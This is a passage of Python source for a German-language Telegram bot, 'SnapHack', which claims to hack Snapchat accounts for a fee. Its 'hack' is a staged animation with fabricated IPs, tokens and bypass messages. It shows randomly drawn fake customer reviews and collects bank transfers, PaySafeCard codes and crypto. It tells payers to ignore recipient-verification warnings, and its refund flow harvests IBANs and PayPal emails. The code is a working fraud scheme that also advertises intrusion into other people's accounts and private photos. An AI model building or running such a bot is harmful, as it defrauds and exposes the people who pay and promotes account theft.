    ("k***n_93", "Hab erst gezögert aber es hat wirklich funktioniert. Support war auch erreichbar."),
    ("s***a.official", "Mega schnell, innerhalb 5 Min alles da. Zahlung per Crypto war super easy."),
    ("t***_real", "Schon 3x genutzt und jedes Mal reibungslos. Kein anderer macht das so professionell."),
    ("j***s22", "Hatte kurz Zweifel aber der Hack hat geklappt. Bilder + Videos alles da. Top!"),
    ("n***i.x", "Sehr empfehlenswert. Schnell und der Support hat sofort geantwortet. 5 Sterne."),
    ("p***lo_de", "Zuerst skeptisch gewesen aber es ist 100% real. Zahlung war sicher und anonym."),
    ("a***a_99", "Innerhalb von 10 Minuten hatte ich Zugang. Genau wie beschrieben. Danke!"),
    ("f***z_official", "Günstig, schnell, diskret. Was will man mehr. Komme sicher wieder."),
]

async def bewertungen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        import random
        auswahl = random.sample(BEWERTUNGEN, 5)
        sterne_map = ["⭐⭐⭐⭐☆", "⭐⭐⭐⭐⭐", "⭐⭐⭐⭐⭐", "⭐⭐⭐⭐⭐", "⭐⭐⭐⭐⭐"]
        random.shuffle(sterne_map)
        gesamt = get_hack_count()
        text = (f"<code>{'━'*34}</code>\n<b>💬 Kundenbewertungen — SnapHack v2.4</b>\n<code>{'━'*34}</code>\n\n")
        for i, (user, kommentar) in enumerate(auswahl):
            text += f"{sterne_map[i]} <b>@{user}</b>\n<i>{kommentar}</i>\n\n"
        text += (f"<code>{'━'*34}</code>\n📊 <b>Durchschnitt:</b> ⭐ 4.9 / 5\n"
                 f"👥 <b>Abgeschlossene Hacks:</b> <code>{gesamt}</code>\n"
                 f"🔗 Mehr Bewertungen: https://t.me/+qICdaAr6lE4yMzZh")
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception as e:
        print(f"❌ Bewertungen Fehler: {e}")
        await update.message.reply_text("⚠️ Fehler beim Laden der Bewertungen. Bitte erneut versuchen.")

# ---- PAY ----
async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
        [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
        [InlineKeyboardButton("🪙 Crypto — Sofort & anonym", callback_data="pay_crypto")],
        [InlineKeyboardButton("⬅️ Zurück zum Hauptmenü", callback_data="back_to_main")],
    ]
    await update.message.reply_text(
        "💳 <b>Zahlung — Zugang freischalten</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        "Dein Hack-Ergebnis ist bereit. Wähle eine Zahlungsmethode:\n\n"
        "🔒 <i>Alle Zahlungen sind sicher und diskret.</i>",
        parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ---- HILFE (Support-Ticket) ----
async def hilfe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    hilfe_state[user_id] = {"step": "email", "data": {}}
    await update.message.reply_text(
        "🎫 <b>Support-Ticket öffnen</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        "Unser Support-Team hilft dir gerne weiter.\n\n"
        "📧 <b>Schritt 1 von 2:</b>\n"
        "Bitte gib deine <b>E-Mail-Adresse</b> ein:",
        parse_mode=ParseMode.HTML
    )

# ---- INVITE / REDEEM / FAQ ----
async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎁 Lade Freunde ein und erhalte einen Free Hack!\n\n"
        "🔗 https://t.me/+o5LA7bbv0E8zZDdh",
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Das Einlösen von Credits ist aktuell nicht verfügbar.")

# ---- REFUND ----
async def refund(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🏦 Banküberweisung", callback_data="refund_bank")],
        [InlineKeyboardButton("💸 PayPal", callback_data="refund_paypal")],
        [InlineKeyboardButton("⬅️ Zurück zum Hauptmenü", callback_data="back_to_main")],
    ]
    await update.message.reply_text(
        "💰 <b>Rückerstattung beantragen</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        "Bitte wähle deine bevorzugte Auszahlungsmethode:\n\n"
        "⚠️ <b>Wichtig:</b> Du musst vorab ein <u>Beweisvideo deiner Überweisung</u> einschicken.\n"
        "Nach erfolgreicher Prüfung erhältst du dein Geld <b>innerhalb von 24 Stunden</b>.",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 <b>Alle Commands &amp; FAQ</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        "🔧 <b>Verfügbare Commands:</b>\n\n"
        "/start — Bot starten &amp; Paket wählen\n"
        "/hack &lt;username&gt; — Snapchat Account hacken\n"
        "/pay — Zugang freischalten\n"
        "/verlauf — Deine bisherigen Hacks anzeigen\n"
        "/bew — Kundenbewertungen lesen\n"
        "/invite — Freunde einladen für Gratis-Hack\n"
        "/refund — Rückerstattung beantragen\n"
        "/hilfe — Support-Ticket öffnen\n"
        "/faq — Diese Übersicht\n\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        "❓ <b>Wie funktioniert das?</b>\n"
        "💬 Tippe <code>/hack Benutzername</code> — der Bot übernimmt alles automatisch.\n\n"
        "❓ <b>Wie lange dauert ein Hack?</b>\n"
        "💬 In der Regel 3–5 Minuten.\n\n"
        "❓ <b>Wie bezahle ich?</b>\n"
        "💬 Nach dem Hack einfach /pay tippen &amp; Methode wählen.\n\n"
        "❓ <b>Bekomme ich mein Geld zurück?</b>\n"
        "💬 Ja, beim ersten Hack gibt es eine 5-Minuten Refund-Zeit. /refund\n\n"
        "❓ <b>Wie sehe ich meine bisherigen Hacks?</b>\n"
        "💬 Mit /verlauf siehst du alle Benutzernamen die du gehackt hast.\n\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        "📩 Noch Fragen? Schreib uns direkt: @HunterThe1",
        parse_mode=ParseMode.HTML
    )

# ---- BUTTONS ----
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    cmd = query.data

    info_refund = (
        "\n\n⚠️ <b>Wichtig:</b> Bei deinem <u>ersten Hack</u> hast du eine "
        "<b>5 Minuten Refund-Zeit</b>. Bei Stornierung bekommst du <b>30 € von den 45 €</b> zurück.\n\n"
        "📌 <b>Verwendungszweck:</b> Gib <u>deinen Telegram-Username</u> an!"
    )

    if cmd == "hack_confirm_yes":
        uid = query.from_user.id
        user_confirm_used[uid] = time.time()
        result = pending_hack_results.pop(uid, None)
        if not result:
            try:
                await query.edit_message_caption("⚠️ Ergebnis nicht mehr verfügbar. Bitte erneut /hack ausführen.")
            except Exception:
                await query.edit_message_text("⚠️ Ergebnis nicht mehr verfügbar. Bitte erneut /hack ausführen.")
            return

        ip_src = result.get("ip_src", fake_ip())
        ip_dst = result.get("ip_dst", fake_ip())
        session_token = result.get("session_token", fake_token())
        name = result.get("name", "Unbekannt")
        bilder = result.get("bilder", 10)
        videos = result.get("videos", 7)
        last_seen_min = result.get("last_seen_min", 20)
        r_lines = result["result_lines"]
        r_caption = result["result_caption"]
        profile_dl = result["profile_downloaded"]
        bitmoji_dl = result["bitmoji_downloaded"]
        uname = result["username"]

        def build_log(*lines, bar_pct: int) -> str:
            body = "\n".join(f"<code>{l}</code>" for l in lines)
            return f"{body}\n<code>{progress_bar(bar_pct)}</code>"

        try:
            await query.message.delete()
        except Exception:
            pass

        anim_msg = await context.bot.send_message(
            chat_id=uid,
            text=build_log(
                f"[ SYSTEM ] Initialisiere Verbindung...",
                f"[ NET    ] SRC: {ip_src} → DST: {ip_dst}",
                f"[ AUTH  ] Session-Token wird generiert...",
                bar_pct=0
            ),
            parse_mode=ParseMode.HTML
        )
        await asyncio.sleep(1.5)

        await anim_msg.edit_text(
            build_log(
                f"[ SYSTEM ] Verbindung aufgebaut          ✓",
                f"[ NET    ] SRC: {ip_src} → DST: {ip_dst}",
                f"[ AUTH  ] Token: {session_token}  ✓",
                f"[ SCAN  ] Profil gefunden: {name}        ✓",
                bar_pct=30
            ),
            parse_mode=ParseMode.HTML
        )
        await asyncio.sleep(1.5)

        await anim_msg.edit_text(
            build_log(
                f"[ SCAN  ] Profil gefunden: {name}        ✓",
                f"[ CHECK ] Letzter Login: vor {last_seen_min} Min.    ✓",
                f"[ BYPASS] Snapchat SSL-Pinning...",
                bar_pct=40
            ),
            parse_mode=ParseMode.HTML
        )
        await asyncio.sleep(1.5)

        await anim_msg.edit_text(
            build_log(
                f"[ SCAN  ] Profil gefunden: {name}        ✓",
                f"[ CHECK ] Voraussetzungen OK              ✓",
                f"[ BYPASS] Snapchat SSL-Pinning...        ✓",
                f"[ BYPASS] 2FA Firewall...                ✓",
                f"[ EXFIL ] Extrahiere Account-Daten...",
                bar_pct=55
            ),
            parse_mode=ParseMode.HTML
        )
        await asyncio.sleep(1.5)

        await anim_msg.edit_text(
            build_log(
                f"[ SCAN  ] Profil gefunden: {name}        ✓",
                f"[ BYPASS] SSL-Pinning + 2FA umgangen     ✓",
                f"[ EXFIL ] Account-Daten extrahiert       ✓",
                f"[ MEDIA ] {bilder} Bilder + {videos} Videos gefunden  ✓",
                f"[ SYNC  ] Lade Inhalte in sicheren Server...",
                bar_pct=70
            ),
            parse_mode=ParseMode.HTML
        )
        await asyncio.sleep(1.5)

        await anim_msg.edit_text(
            build_log(
                f"[ BYPASS] SSL-Pinning + 2FA umgangen     ✓",
                f"[ EXFIL ] Account-Daten extrahiert       ✓",
                f"[ MEDIA ] {bilder} Bilder + {videos} Videos gesichert ✓",
                f"[ SYNC  ] Upload läuft... ({bilder + videos} Dateien)",
                bar_pct=88
            ),
            parse_mode=ParseMode.HTML
        )
        await asyncio.sleep(1.5)

        await anim_msg.edit_text(
            build_log(
                f"[ BYPASS] SSL-Pinning + 2FA umgangen     ✓",
                f"[ EXFIL ] Account-Daten extrahiert       ✓",
                f"[ MEDIA ] {bilder} Bilder + {videos} Videos gesichert ✓",
                f"[ SYNC  ] Upload abgeschlossen            ✓",
                f"[ FINAL ] Erstelle Zugangslink...",
                bar_pct=100
            ),
            parse_mode=ParseMode.HTML
        )
        await asyncio.sleep(1.5)

        await anim_msg.delete()

        if profile_dl:
            try:
                with open(PROFILE_DIR / f"profile_{uname}.jpg", "rb") as pf:
                    await context.bot.send_photo(chat_id=uid, photo=pf, caption=r_caption, parse_mode=ParseMode.HTML)
                return
            except Exception:
                pass
        if bitmoji_dl:
            try:
                with open(PROFILE_DIR / f"bitmoji_{uname}.jpg", "rb") as pf:
                    await context.bot.send_photo(chat_id=uid, photo=pf, caption=r_caption, parse_mode=ParseMode.HTML)
                return
            except Exception:
                pass
        await context.bot.send_message(chat_id=uid, text=r_lines, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        return

    elif cmd == "hack_confirm_no":
        uid = query.from_user.id
        user_confirm_used[uid] = time.time()
        pending_hack_results.pop(uid, None)
        await query.edit_message_caption(
            "❌ <b>Falscher Account!</b>\n\n"
            "Du hast <b>1 Bestätigung pro 12 Stunden</b> verbraucht.\n\n"
            "Versuche es erneut mit dem richtigen Benutzernamen:\n"
            "<code>/hack Benutzername</code>",
            parse_mode=ParseMode.HTML
        )
        return

    if cmd == "back_to_plans":
        await query.edit_message_text(
            PACKAGE_TEXT,
            parse_mode=ParseMode.HTML,
            reply_markup=PACKAGE_KEYBOARD
        )
        return
    elif cmd == "back_to_main":
        uid = query.from_user.id
        plan = user_plan.get(uid, "basic")
        back_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️ Zurück zur Paktwahl", callback_data="back_to_plans")]
        ])
        await query.edit_message_text(
            main_menu_text(plan),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=back_kb
        )
        return
    elif cmd == "back_to_refund":
        uid = query.from_user.id
        refund_state.pop(uid, None)
        refund_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🏦 Banküberweisung", callback_data="refund_bank")],
            [InlineKeyboardButton("💸 PayPal", callback_data="refund_paypal")],
            [InlineKeyboardButton("⬅️ Zurück zum Hauptmenü", callback_data="back_to_main")],
        ])
        await query.edit_message_text(
            "💰 <b>Rückerstattung beantragen</b>\n"
            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            "Bitte wähle deine bevorzugte Auszahlungsmethode:\n\n"
            "⚠️ <b>Wichtig:</b> Du musst vorab ein <u>Beweisvideo deiner Überweisung</u> einschicken.\n"
            "Nach erfolgreicher Prüfung erhältst du dein Geld <b>innerhalb von 24 Stunden</b>.",
            parse_mode=ParseMode.HTML,
            reply_markup=refund_kb
        )
        return
    elif cmd == "plan_basic":
        uid = query.from_user.id
        user_plan[uid] = "basic"
        if uid in user_reminder_tasks:
            user_reminder_tasks[uid].cancel()
        user_reminder_tasks[uid] = asyncio.create_task(schedule_reminders(context.bot, uid))
        back_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️ Zurück zur Paktwahl", callback_data="back_to_plans")]
        ])
        await query.edit_message_text(
            main_menu_text("basic"),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=back_kb
        )
        return
    elif cmd == "plan_premium":
        uid = query.from_user.id
        user_plan[uid] = "premium"
        premium_pending.add(uid)
        if uid in user_reminder_tasks:
            user_reminder_tasks[uid].cancel()
        task = asyncio.create_task(schedule_premium_reminder(context.bot, uid))
        user_reminder_tasks[uid] = task
        back_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️ Zurück zur Paktwahl", callback_data="back_to_plans")]
        ])
        await query.edit_message_text(
            "💎 <b>PREMIUM-Paket gewählt!</b>\n"
            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            "Um deinen Zugang freizuschalten, überweise <b>95 €</b> an:\n\n"
            "🏦 <b>IBAN:</b> <code>IE32 PPSE 9903 8091 8899 18</code>\n"
            "👤 <b>Empfänger:</b> <code>Euro Hunter</code>\n"
            "💶 <b>Betrag:</b> <code>95,00 EUR</code>\n\n"
            "⚠️ Auch wenn ein Fehler bei der Empfänger-Überprüfung kommt — einfach auf <i>Weiter</i> tippen.\n\n"
            "📸📹 <b>Sende jetzt ein Foto oder Video deines Zahlungsbelegs hier im Chat.</b>\n\n"
            "<i>Dein Konto wird nach Prüfung innerhalb weniger Minuten freigeschaltet.</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=back_kb
        )
        return
    elif cmd.startswith("approve_premium_"):
        if query.from_user.id != ADMIN_CHAT_ID:
            await query.answer("❌ Kein Zugriff.", show_alert=True)
            return
        target_uid = int(cmd.split("_")[2])
        premium_pending.discard(target_uid)
        premium_approved.add(target_uid)
        try:
            await context.bot.send_message(
                chat_id=target_uid,
                text=(
                    "✅ <b>Dein Premium-Zugang wurde freigeschaltet!</b>\n\n"
                    "💎 Du hast jetzt vollen Zugriff auf alle Features.\n\n"
                    "🚀 Starte deinen ersten Hack mit:\n"
                    "<code>/hack Benutzername</code>"
                ),
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            print(f"❌ Premium-Benachrichtigung: {e}")
        await query.edit_message_reply_markup(reply_markup=None)
        await query.answer("✅ Nutzer freigeschaltet!", show_alert=True)
        return
    elif cmd == "pay_bank":
        text = (
            "🏦 <b>Banküberweisung</b>\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            "📋 <b>Empfänger:</b> <code>Euro Hunter</code>\n"
            "🏛 <b>IBAN:</b> <code>IE32 PPSE 9903 8091 8899 18</code>\n"
            "💶 <b>Betrag:</b> <code>45,00 EUR</code>\n\n"
            "ℹ️ Tippe auf IBAN zum Kopieren.\n"
            "⚠️ Auch wenn ein Fehler bei der Empfänger-Überprüfung kommt — einfach auf <i>Weiter</i> tippen.\n"
            f"{info_refund}\n\n📸📹 <b>Sende danach ein Foto oder Video deines Zahlungsbelegs hier im Chat.</b>"
        )
    elif cmd == "pay_paysafe":
        text = (
            "💳 <b>PaySafeCard</b>\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            "Sende deinen <b>16-stelligen Code</b> direkt hier im Chat:\n\n"
            "<code>XXXX-XXXX-XXXX-XXXX</code>\n\n"
            "✅ Der Code wird sofort geprüft und weitergeleitet.\n"
            f"{info_refund}"
        )
    elif cmd == "pay_crypto":
        text = (
            "🪙 <b>Crypto-Zahlung</b>\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            "Tippe auf die Adresse zum Kopieren:\n\n"
            "₿ <b>Bitcoin:</b>\n<code>bc1q4jlqdsr8epqp9fd7vacn24m7s0hahdau4t0s6q</code>\n\n"
            "Ξ <b>Ethereum:</b>\n<code>0x456F994998c7c36892e6E0dcd8A71a5e85dddc56</code>\n\n"
            "◎ <b>Solana:</b>\n<code>4WEvmt31TcuBXVR5Qcw6Ea6R4KZBQHSJ3uHCZWiFmCb7</code>\n\n"
            "💡 Kein Crypto? Kaufe es gebührenfrei auf <b>cryptovoucher.io</b>\n"
            f"{info_refund}\n\n📸📹 <b>Sende danach ein Foto oder Video deines Zahlungsbelegs hier im Chat.</b>"
        )
    elif cmd == "pay":
        keyboard = [
            [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
            [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
            [InlineKeyboardButton("🪙 Crypto — Sofort & anonym", callback_data="pay_crypto")],
            [InlineKeyboardButton("⬅️ Zurück zum Hauptmenü", callback_data="back_to_main")],
        ]
        await query.edit_message_text(
            "💳 <b>Zahlung — Zugang freischalten</b>\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            "Dein Hack-Ergebnis ist bereit. Wähle eine Zahlungsmethode:\n\n"
            "🔒 <i>Alle Zahlungen sind sicher und diskret.</i>",
            parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    elif cmd == "refund_bank":
        refund_state[query.from_user.id] = {"step": "bank_iban", "method": "bank", "data": {}}
        back_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️ Zurück", callback_data="back_to_refund")]
        ])
        await query.edit_message_text(
            "🏦 <b>Banküberweisung — Rückerstattung</b>\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            "Bitte gib deine <b>IBAN</b> ein:\n\n<i>Beispiel: DE89 3704 0044 0532 0130 00</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=back_kb
        )
        return
    elif cmd == "refund_paypal":
        refund_state[query.from_user.id] = {"step": "paypal_email", "method": "paypal", "data": {}}
        back_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️ Zurück", callback_data="back_to_refund")]
        ])
        await query.edit_message_text(
            "💸 <b>PayPal — Rückerstattung</b>\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            "Bitte gib deine <b>PayPal-E-Mail-Adresse</b> ein:",
            parse_mode=ParseMode.HTML,
            reply_markup=back_kb
        )
        return
    else:
        await query.edit_message_text("Ungültige Auswahl.")
        return

    keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))

# ---- Hilfsfunktion: Beweis ans Admin weiterleiten ----
async def _forward_proof_photo(context, from_user, photo_file_id, caption, is_premium: bool):
    uid = from_user.id
    label = user_label(from_user)
    betrag = "95 €" if is_premium else "45 €"
    prefix = "💎 <b>PREMIUM-Zahlungsbeleg</b>" if is_premium else "📸 <b>Neuer Zahlungsbeweis</b>"
    forward_text = (
        f"{prefix}\n\n"
        f"👤 {label}\n"
        f"💶 Betrag: {betrag}\n"
        f"Bildunterschrift: {caption}"
    )
    if is_premium:
        approve_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"✅ Premium freischalten für {label}", callback_data=f"approve_premium_{uid}")]
        ])
        await context.bot.send_photo(
            chat_id=ADMIN_CHAT_ID, photo=photo_file_id,
            caption=forward_text, parse_mode=ParseMode.HTML, reply_markup=approve_kb
        )
    else:
        sent = await context.bot.send_photo(
            chat_id=ADMIN_CHAT_ID, photo=photo_file_id,
            caption=forward_text, parse_mode=ParseMode.HTML
        )
        forwarded_msg_to_user[sent.message_id] = uid

async def _forward_proof_video(context, from_user, video_file_id, caption, is_premium: bool):
    uid = from_user.id
    label = user_label(from_user)
    betrag = "95 €" if is_premium else "45 €"
    prefix = "💎 <b>PREMIUM-Zahlungsbeleg (Video)</b>" if is_premium else "📹 <b>Neuer Zahlungsbeweis (Video)</b>"
    forward_text = (
        f"{prefix}\n\n"
        f"👤 {label}\n"
        f"💶 Betrag: {betrag}\n"
        f"Bildunterschrift: {caption}"
    )
    if is_premium:
        approve_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"✅ Premium freischalten für {label}", callback_data=f"approve_premium_{uid}")]
        ])
        await context.bot.send_video(
            chat_id=ADMIN_CHAT_ID, video=video_file_id,
            caption=forward_text, parse_mode=ParseMode.HTML, reply_markup=approve_kb
        )
    else:
        sent = await context.bot.send_video(
            chat_id=ADMIN_CHAT_ID, video=video_file_id,
            caption=forward_text, parse_mode=ParseMode.HTML
        )
        forwarded_msg_to_user[sent.message_id] = uid

# ---- PHOTO (Zahlungsbeweis) ----
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    from_user = update.message.from_user
    user_id = from_user.id

    if user_id == ADMIN_CHAT_ID:
        return

    photo = update.message.photo[-1]
    caption = update.message.caption or ""

    if user_id in premium_pending:
        try:
            await _forward_proof_photo(context, from_user, photo.file_id, caption, is_premium=True)
            await update.message.reply_text(
                "✅ <b>Zahlungsbeleg erhalten!</b>\n\n"
                "Dein Beleg wird gerade geprüft. Du wirst automatisch benachrichtigt, "
                "sobald dein Premium-Zugang freigeschaltet wurde.\n\n"
                "<i>Das dauert in der Regel nur wenige Minuten.</i>",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            print(f"❌ Premium-Foto: {e}")
            await update.message.reply_text("❌ Fehler beim Übermitteln. Bitte versuche es nochmal oder kontaktiere @HunterThe1 direkt.")
        return

    if user_id in user_proof_sent:
        await update.message.reply_text("❌ Du kannst nur einmal einen Zahlungsbeweis senden.")
        return

    try:
        await _forward_proof_photo(context, from_user, photo.file_id, caption, is_premium=False)
        user_proof_sent.add(user_id)
        await update.message.reply_text(
            "✅ Dein Zahlungsbeweis wurde erfolgreich übermittelt! "
            "Wir prüfen ihn so schnell wie möglich. "
            "Falls du nach 5 Minuten noch keine Rückmeldung hast, wende dich gerne an @HunterThe1 😊"
        )
    except Exception as e:
        print(f"❌ Fehler beim Senden des Beweisfotos an Admin ({ADMIN_CHAT_ID}): {e}")
        await update.message.reply_text(
            "❌ Fehler beim Übermitteln. Bitte versuche es nochmal oder kontaktiere @HunterThe1 direkt."
        )

# ---- VIDEO (Zahlungsbeweis + Refund-Beweis) ----
async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    from_user = update.message.from_user
    user_id = from_user.id

    if user_id == ADMIN_CHAT_ID:
        return

    video = update.message.video or update.message.document
    caption = update.message.caption or ""

    if user_id in premium_pending:
        if not video:
            await update.message.reply_text("⚠️ Bitte sende das Video als Video-Nachricht.")
            return
        try:
            await _forward_proof_video(context, from_user, video.file_id, caption, is_premium=True)
            await update.message.reply_text(
                "✅ <b>Zahlungsbeleg (Video) erhalten!</b>\n\n"
                "Dein Beleg wird gerade geprüft. Du wirst automatisch benachrichtigt, "
                "sobald dein Premium-Zugang freigeschaltet wurde.\n\n"
                "<i>Das dauert in der Regel nur wenige Minuten.</i>",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            print(f"❌ Premium-Video: {e}")
            await update.message.reply_text("❌ Fehler beim Übermitteln. Bitte versuche es nochmal oder kontaktiere @HunterThe1 direkt.")
        return

    if user_id not in refund_state:
        if not video:
            return
        if user_id in user_proof_sent:
            await update.message.reply_text("❌ Du kannst nur einmal einen Zahlungsbeweis senden.")
            return
        try:
            await _forward_proof_video(context, from_user, video.file_id, caption, is_premium=False)
            user_proof_sent.add(user_id)
            await update.message.reply_text(
                "✅ Dein Zahlungsbeweis (Video) wurde erfolgreich übermittelt! "
                "Wir prüfen ihn so schnell wie möglich. "
                "Falls du nach 5 Minuten noch keine Rückmeldung hast, wende dich gerne an @HunterThe1 😊"
            )
        except Exception as e:
            print(f"❌ Fehler beim Senden des Beweis-Videos an Admin ({ADMIN_CHAT_ID}): {e}")
            await update.message.reply_text(
                "❌ Fehler beim Übermitteln. Bitte versuche es nochmal oder kontaktiere @HunterThe1 direkt."
            )
        return

    state = refund_state[user_id]
    if state["step"] not in ("bank_video", "paypal_video"):
        return

    if not video:
        await update.message.reply_text("⚠️ Bitte sende das Video als Video-Nachricht (nicht als Datei).")
        return

    method = state["method"]
    data = state["data"]
    label = user_label(from_user)

    if method == "bank":
        details = (
            f"🔄 <b>Refund-Antrag — Banküberweisung</b>\n"
            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            f"👤 <b>Nutzer:</b> {label}\n"
            f"🏦 <b>IBAN:</b> <code>{data.get('iban', '—')}</code>\n"
            f"👤 <b>Kontoinhaber:</b> <code>{data.get('name', '—')}</code>\n"
            f"💶 <b>Methode:</b> Banküberweisung"
        )
    else:
        details = (
            f"🔄 <b>Refund-Antrag — PayPal</b>\n"
            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            f"👤 <b>Nutzer:</b> {label}\n"
            f"📧 <b>PayPal-E-Mail:</b> <code>{data.get('email', '—')}</code>\n"
            f"💶 <b>Methode:</b> PayPal"
        )

    try:
        await context.bot.send_video(
            chat_id=ADMIN_CHAT_ID,
            video=video.file_id,
            caption=details,
            parse_mode=ParseMode.HTML
        )
        del refund_state[user_id]
        await update.message.reply_text(
            "✅ <b>Dein Refund-Antrag wurde erfolgreich eingereicht!</b>\n\n"
            "📋 Wir prüfen deinen Beweis sorgfältig.\n"
            "Wenn alles passt, erhältst du dein Geld <b>innerhalb von 24 Stunden</b>.\n\n"
            "Bei Fragen: @HunterThe1 😊",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        print(f"❌ Refund-Video Fehler: {e}")
        await update.message.reply_text("❌ Fehler beim Übermitteln. Bitte versuche es nochmal.")

# ---- TEXT (Admin-Reply + Paysafe + Refund-Schritte + Hilfe-Ticket) ----
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message is None:
        return
    raw = update.message.text
    if not raw:
        return
    text = raw.strip()
    from_user = update.message.from_user
    user_id = from_user.id

    if user_id == ADMIN_CHAT_ID:
        if update.message.reply_to_message:
            original = update.message.reply_to_message
            target_id = None
            if original.forward_from:
                target_id = original.forward_from.id
            if not target_id:
                target_id = forwarded_msg_to_user.get(original.message_id)
            if target_id:
                try:
                    await context.bot.send_message(chat_id=target_id, text=text)
                    await update.message.reply_text("✅ Nachricht erfolgreich zugestellt.")
                except Exception as e:
                    await update.message.reply_text(f"❌ Fehler beim Senden: {e}")
            else:
                await update.message.reply_text(
                    "⚠️ Nutzer-ID nicht erkennbar.\n"
                    "Der Nutzer hat Privatsphäre-Einstellungen aktiviert."
                )
        return

    if user_id in hilfe_state:
        state = hilfe_state[user_id]
        step = state["step"]

        if step == "email":
            email_regex = r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$'
            if not re.match(email_regex, text):
                await update.message.reply_text(
                    "❌ <b>Ungültige E-Mail-Adresse.</b>\n\n"
                    "Bitte gib eine gültige E-Mail-Adresse ein:\n"
                    "<i>Beispiel: name@example.com</i>",
                    parse_mode=ParseMode.HTML
                )
                return
            state["data"]["email"] = text
            state["step"] = "grund"
            await update.message.reply_text(
                "✅ <b>E-Mail gespeichert.</b>\n\n"
                "📝 <b>Schritt 2 von 2:</b>\n"
                "Bitte beschreibe deinen <b>Grund</b> für das Support-Ticket.\n\n"
                "⚠️ <i>Dein Text muss mindestens <b>50 Zeichen</b> lang sein.</i>",
                parse_mode=ParseMode.HTML
            )
            return

        elif step == "grund":
            if len(text) < 50:
                fehlende = 50 - len(text)
                await update.message.reply_text(
                    f"❌ <b>Dein Grund ist zu kurz!</b>\n\n"
                    f"Du hast <b>{len(text)} Zeichen</b> geschrieben.\n"
                    f"Es fehlen noch <b>{fehlende} Zeichen</b>.\n\n"
                    f"Bitte schreibe mindestens <b>50 Zeichen</b>, damit wir dir besser helfen können.",
                    parse_mode=ParseMode.HTML
                )
                return

            email = state["data"]["email"]
            label = user_label(from_user)
            del hilfe_state[user_id]

            ticket_text = (
                f"🎫 <b>Neues Support-Ticket</b>\n"
                f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
                f"👤 <b>Nutzer:</b> {label}\n"
                f"📧 <b>E-Mail:</b> <code>{email}</code>\n"
                f"📝 <b>Grund:</b>\n{text}"
            )
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=ticket_text,
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                print(f"❌ Support-Ticket an Admin: {e}")

            await update.message.reply_text(
